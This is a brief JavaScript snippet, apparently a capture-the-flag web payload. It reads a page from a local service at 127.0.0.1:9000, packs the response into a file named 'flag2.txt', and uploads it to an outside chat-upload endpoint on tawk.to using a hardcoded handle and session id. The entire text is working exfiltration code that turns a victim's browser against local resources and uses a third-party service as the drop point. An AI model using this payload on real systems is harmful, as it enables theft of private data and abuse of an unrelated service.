
fetch("http://127.0.0.1:9000/view/46b5d1b0-8a08-4e75-818a-4003a7d61a5c").then((res) => {
    return res.text();
  }).then(data => {
			var formData = new FormData();
			var file = new File([data], "flag2.txt", {
			type: "text/plain",
		});

    formData.append("upload", file);

    fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=0c47125a3139b11ae32bd67965c9a0f461d1c92c&visitorSessionId=61860b2ece40c32e3e38daad",{
        method: 'POST',
        body: formData
    });

})
